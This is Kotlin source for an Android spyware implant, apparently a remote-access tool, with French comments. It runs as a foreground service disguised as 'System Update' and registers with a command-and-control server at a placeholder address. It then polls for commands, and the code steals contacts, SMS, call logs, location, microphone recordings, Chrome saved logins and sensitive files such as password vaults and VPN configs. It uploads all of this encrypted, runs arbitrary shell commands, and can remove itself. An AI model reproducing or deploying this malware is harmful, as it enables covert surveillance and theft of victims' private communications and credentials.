package com.c2.implant

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.provider.ContactsContract
import android.provider.Telephony
import android.provider.CallLog
import android.provider.MediaStore
import android.location.Location
import android.location.LocationManager
import android.media.MediaRecorder
import android.hardware.camera2.CameraManager
import android.content.Context
import android.os.Environment
import android.util.Base64
import org.json.JSONArray
import org.json.JSONObject
import java.io.*
import java.net.HttpURLConnection
import java.net.URL
import java.security.SecureRandom
import javax.crypto.Cipher
import javax.crypto.KeyGenerator
import javax.crypto.SecretKey
import javax.crypto.spec.GCMParameterSpec
import kotlinx.coroutines.*

class ForegroundService : Service() {

    private val CHANNEL_ID = "c2_implant_channel"
    private val NOTIFICATION_ID = 1
    private val C2_URL = "https://<VOTRE_IP>:443"  // CHANGEZ MOI
    private var hwId: String = ""
    private var sessionKey: SecretKey? = null
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var mediaRecorder: MediaRecorder? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        hwId = generateHWID()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val notification = buildNotification()
        startForeground(NOTIFICATION_ID, notification)

        // Lancer la boucle de collecte
        scope.launch {
            registerWithC2()
            while (isActive) {
                pollCommands()
                delay(60000) // 60 secondes
            }
        }

        return START_STICKY
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Services",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Background system services"
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun buildNotification(): Notification {
        val builder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder(this, CHANNEL_ID)
        } else {
            Notification.Builder(this)
        }
        return builder
            .setContentTitle("System Update")
            .setContentText("Checking for updates...")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setOngoing(true)
            .setPriority(Notification.PRIORITY_MIN)
            .build()
    }

    private fun generateHWID(): String {
        val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
        val serial = Build.SERIAL ?: "unknown"
        val device = Build.DEVICE
        return "ANDROID_${androidId}_${serial}_${device}"
    }

    private fun registerWithC2() {
        try {
            val url = URL("$C2_URL/api/v1/weather/register")
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json")
            conn.doOutput = true
            conn.connectTimeout = 10000
            conn.readTimeout = 10000

            // Générer la clé de session
            val keyGen = KeyGenerator.getInstance("AES")
            keyGen.init(256)
            sessionKey = keyGen.generateKey()

            val payload = JSONObject().apply {
                put("hw_id", hwId)
                put("device_name", "${Build.MANUFACTURER} ${Build.MODEL}")
                put("ios_version", "Android ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})")
                put("pub_key", Base64.encodeToString(sessionKey!!.encoded, Base64.NO_WRAP))
            }

            conn.outputStream.write(payload.toString().toByteArray())
            conn.outputStream.flush()

            if (conn.responseCode == 200) {
                log("[+] Enregistré sur le C2 : $hwId")
            }
            conn.disconnect()
        } catch (e: Exception) {
            log("[-] Erreur enregistrement : ${e.message}")
        }
    }

    private fun pollCommands() {
        try {
            val url = URL("$C2_URL/api/v1/weather/config")
            val conn = url.openConnection() as HttpURLConnection
            conn.setRequestProperty("X-Implant-Auth", hwId)
            conn.connectTimeout = 10000
            conn.readTimeout = 10000

            if (conn.responseCode == 200) {
                val response = JSONObject(conn.inputStream.bufferedReader().readText())
                val commands = response.optJSONArray("commands")
                if (commands != null) {
                    for (i in 0 until commands.length()) {
                        val cmd = commands.getJSONObject(i)
                        executeCommand(cmd.getString("cmd"), cmd.optJSONObject("params") ?: JSONObject())
                    }
                }
            }
            conn.disconnect()
        } catch (e: Exception) {
            // Silencieux
        }
    }

    private fun executeCommand(cmd: String, params: JSONObject) {
        log("[*] Commande reçue : $cmd")
        when (cmd) {
            "collect_contacts" -> collectContacts()
            "collect_sms" -> collectSMS()
            "collect_call_log" -> collectCallLog()
            "collect_files" -> collectFiles(params.optString("path", Environment.getExternalStorageDirectory().absolutePath))
            "collect_location" -> collectLocation()
            "collect_microphone" -> collectMicrophone()
            "collect_contacts_browser" -> collectBrowserData()
            "collect_screenshot" -> takeScreenshot()
            "collect_system_info" -> collectSystemInfo()
            "exec_shell" -> execShell(params.optString("cmd", "id"))
            "self_destruct" -> selfDestruct()
        }
    }

    private fun sendData(dataType: String, items: JSONArray) {
        try {
            val payload = JSONObject().apply {
                put("type", dataType)
                put("items", items)
            }
            val encrypted = encryptAES(payload.toString())

            val url = URL("$C2_URL/api/v1/weather/data")
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("X-Implant-Auth", hwId)
            conn.setRequestProperty("Content-Type", "application/octet-stream")
            conn.doOutput = true
            conn.connectTimeout = 10000
            conn.readTimeout = 10000

            conn.outputStream.write(encrypted)
            conn.outputStream.flush()
            conn.disconnect()
            log("[+] ${items.length()} éléments $dataType envoyés")
        } catch (e: Exception) {
            log("[-] Erreur envoi $dataType : ${e.message}")
        }
    }

    private fun encryptAES(plaintext: String): ByteArray {
        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        val iv = ByteArray(12)
        SecureRandom().nextBytes(iv)
        val spec = GCMParameterSpec(128, iv)
        cipher.init(Cipher.ENCRYPT_MODE, sessionKey, spec)
        val ct = cipher.doFinal(plaintext.toByteArray())
        return iv + ct
    }

    // ═══════════════════════════════════════════
    //  COLLECTEURS
    // ═══════════════════════════════════════════

    private fun collectContacts() {
        val items = JSONArray()
        val cursor = contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null, null, null, null
        )
        cursor?.use {
            while (it.moveToNext()) {
                val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                val phone = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
                items.put(JSONObject().apply {
                    put("name", name)
                    put("phone", phone)
                    put("source", "Android_Contacts")
                })
            }
        }
        sendData("contacts", items)
    }

    private fun collectSMS() {
        val items = JSONArray()
        val cursor = contentResolver.query(
            Telephony.Sms.Inbox.CONTENT_URI,
            null, null, null, "${Telephony.Sms.Inbox.DATE} DESC LIMIT 200"
        )
        cursor?.use {
            while (it.moveToNext()) {
                val address = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.Inbox.ADDRESS))
                val body = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.Inbox.BODY))
                val date = it.getLong(it.getColumnIndexOrThrow(Telephony.Sms.Inbox.DATE))
                items.put(JSONObject().apply {
                    put("address", address)
                    put("body", body)
                    put("date", date)
                })
            }
        }
        sendData("sms", items)
    }

    private fun collectCallLog() {
        val items = JSONArray()
        val cursor = contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            null, null, null, "${CallLog.Calls.DATE} DESC LIMIT 200"
        )
        cursor?.use {
            while (it.moveToNext()) {
                val number = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.NUMBER))
                val type = it.getInt(it.getColumnIndexOrThrow(CallLog.Calls.TYPE))
                val duration = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DURATION))
                val date = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DATE))
                items.put(JSONObject().apply {
                    put("number", number)
                    put("type", when (type) {
                        CallLog.Calls.INCOMING_TYPE -> "INCOMING"
                        CallLog.Calls.OUTGOING_TYPE -> "OUTGOING"
                        CallLog.Calls.MISSED_TYPE -> "MISSED"
                        else -> "UNKNOWN"
                    })
                    put("duration", duration)
                    put("date", date)
                })
            }
        }
        sendData("call_log", items)
    }

    private fun collectFiles(basePath: String) {
        val items = JSONArray()
        val extensions = setOf(".txt", ".doc", ".docx", ".xls", ".xlsx", ".pdf",
            ".jpg", ".png", ".mp4", ".zip", ".rar", ".7z", ".kdbx", ".sqlite", ".db",
            ".csv", ".pst", ".ost", ".eml", ".msg", ".log", ".cfg", ".conf", ".ini",
            ".ovpn", ".rdp", ".vnc")
        val maxSize = 10 * 1024 * 1024 // 10 MB

        val fileTreeWalk = File(basePath).walkTopDown()
        fileTreeWalk.forEach { file ->
            if (file.isFile && file.extension.lowercase() in extensions && file.length() < maxSize) {
                try {
                    val content = Base64.encodeToString(file.readBytes(), Base64.NO_WRAP)
                    items.put(JSONObject().apply {
                        put("path", file.absolutePath)
                        put("size", file.length())
                        put("content", content)
                    })
                    if (items.length() >= 50) return@forEach
                } catch (_: Exception) {}
            }
        }
        sendData("files", items)
    }

    private fun collectLocation() {
        val items = JSONArray()
        val locationManager = getSystemService(LOCATION_SERVICE) as LocationManager
        try {
            val location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                ?: locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            if (location != null) {
                items.put(JSONObject().apply {
                    put("lat", location.latitude)
                    put("lon", location.longitude)
                    put("accuracy", location.accuracy)
                    put("timestamp", location.time)
                })
            }
        } catch (_: SecurityException) {}
        sendData("locations", items)
    }

    private fun collectMicrophone() {
        val items = JSONArray()
        try {
            val file = File(cacheDir, "mic_${System.currentTimeMillis()}.3gp")
            mediaRecorder = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
                setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
                setOutputFile(file.absolutePath)
                prepare()
                start()
            }
            // Enregistrer 15 secondes
            Thread.sleep(15000)
            mediaRecorder?.stop()
            mediaRecorder?.release()
            mediaRecorder = null

            val content = Base64.encodeToString(file.readBytes(), Base64.NO_WRAP)
            items.put(JSONObject().apply {
                put("filename", file.name)
                put("content", content)
            })
            file.delete()
        } catch (e: Exception) {
            log("[-] Erreur micro : ${e.message}")
        }
        sendData("microphone", items)
    }

    private fun takeScreenshot() {
        // Nécessite l'AccessibilityService pour le screenshot
        // L'AccessibilityService peut prendre des screenshots
        log("[*] Screenshot demandé via AccessibilityService")
    }

    private fun collectBrowserData() {
        val items = JSONArray()
        // Tentative de lecture des bases de données Chrome
        try {
            val chromeDir = File("/data/data/com.android.chrome/app_chrome/Default")
            if (chromeDir.exists()) {
                val loginDb = File(chromeDir, "Login Data")
                if (loginDb.exists()) {
                    val content = Base64.encodeToString(loginDb.readBytes(), Base64.NO_WRAP)
                    items.put(JSONObject().apply {
                        put("browser", "Chrome")
                        put("file", "Login Data")
                        put("content", content)
                    })
                }
            }
        } catch (_: Exception) {}
        sendData("browser_data", items)
    }

    private fun collectSystemInfo() {
        val items = JSONArray()
        items.put(JSONObject().apply {
            put("device", Build.DEVICE)
            put("model", "${Build.MANUFACTURER} ${Build.MODEL}")
            put("android_version", Build.VERSION.RELEASE)
            put("api_level", Build.VERSION.SDK_INT)
            put("board", Build.BOARD)
            put("hardware", Build.HARDWARE)
            put("fingerprint", Build.FINGERPRINT)
            put("serial", Build.SERIAL)
            put("hwid", hwId)
            // Tenter d'obtenir l'IP
            // (nécessite une requête externe ou WifiManager)
        })
        sendData("system_info", items)
    }

    private fun execShell(cmd: String) {
        val items = JSONArray()
        try {
            val process = Runtime.getRuntime().exec(cmd)
            val output = process.inputStream.bufferedReader().readText()
            items.put(JSONObject().apply {
                put("command", cmd)
                put("output", output)
            })
        } catch (e: Exception) {
            items.put(JSONObject().apply {
                put("command", cmd)
                put("error", e.message)
            })
        }
        sendData("shell_output", items)
    }

    private fun selfDestruct() {
        // Supprimer les traces
        try {
            val pm = packageManager
            val intent = Intent(Intent.ACTION_DELETE, android.net.Uri.parse("package:$packageName"))
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
        } catch (_: Exception) {}
        stopSelf()
    }

    private fun log(msg: String) {
        android.util.Log.d("C2_IMPLANT", msg)
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        scope.cancel()
        super.onDestroy()
    }
}
